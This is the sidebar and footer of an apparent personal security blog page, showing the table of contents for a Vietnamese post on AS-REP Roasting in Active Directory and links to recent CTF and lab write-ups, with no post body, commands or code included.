hacking, pentesting, red teaming and more...</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#IredTeam-AS-REP-Roasting"><span class="toc-number">1.</span> <span class="toc-text">IredTeam AS-REP Roasting</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#AS-REP-la-gi"><span class="toc-number">1.1.</span> <span class="toc-text">AS-REP là gì?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ky-thuat-AS-REP-Roasting"><span class="toc-number">1.2.</span> <span class="toc-text">Kỹ thuật AS-REP Roasting</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tai-sao-lai-co-thuoc-tinh-%E2%80%9CKhong-yeu-cau-xac-thuc-truoc%E2%80%9D"><span class="toc-number">1.3.</span> <span class="toc-text">Tại sao lại có thuộc tính “Không yêu cầu xác thực trước”?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Execution"><span class="toc-number">1.4.</span> <span class="toc-text">Execution</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Buoc-1-Tao-user-moi-va-bat-do-not-require-Kerberos-preauthentication"><span class="toc-number">1.4.1.</span> <span class="toc-text">Buớc 1: Tạo user mới và bât do not require Kerberos preauthentication</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Buoc-2-Liet-ke-user-co-the-tan-cong"><span class="toc-number">1.4.2.</span> <span class="toc-text">Bước 2: Liệt kê user có thể tấn công</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Su-dung-tool-Ruberus-de-thuc-hien-AS-REP-Roasting"><span class="toc-number">1.4.3.</span> <span class="toc-text">Sử dụng tool Ruberus để thực hiện AS-REP Roasting</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Crack-password-bang-hashcat"><span class="toc-number">1.4.4.</span> <span class="toc-text">Crack password bằng hashcat</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/12/31/2025-12-31-SSTI-Velocity/" title="Velocity Server Side Template Injection Challenge">Velocity Server Side Template Injection Challenge</a><time datetime="2025-12-31T04:43:06.549Z" title="Created 2025-12-31 11:43:06">2025-12-31</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/12/25/2025-12-25-CBJS-Misconfiguration/" title="CBJS Java Misconfiguration Challenge">CBJS Java Misconfiguration Challenge</a><time datetime="2025-12-25T13:30:27.815Z" title="Created 2025-12-25 20:30:27">2025-12-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/12/05/2025-12-05-TryHackMe-Hammer/" title="Tryhackme Hammer challenge WriteUp">Tryhackme Hammer challenge WriteUp</a><time datetime="2025-12-04T18:19:12.763Z" title="Created 2025-12-05 01:19:12">2025-12-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/12/02/2025-12-02-iredTeam-AS-REP-Roasting/" title="IredTeam AS-REP Roasting">IredTeam AS-REP Roasting</a><time datetime="2025-12-01T19:26:14.492Z" title="Created 2025-12-02 02:26:14">2025-12-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/12/01/2025-12-01-SSTI-Lab/" title="ServerSide Template Injection (SSTI) Lab">ServerSide Template Injection (SSTI) Lab</a><time datetime="2025-12-01T08:32:26.148Z" title="Created 2025-12-01 15:32:26">2025-12-01</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By Phat Mai</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.1</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.2"></script><script src="/js/main.js?v=5.5.2"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.4/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="/"></script></div></body></html>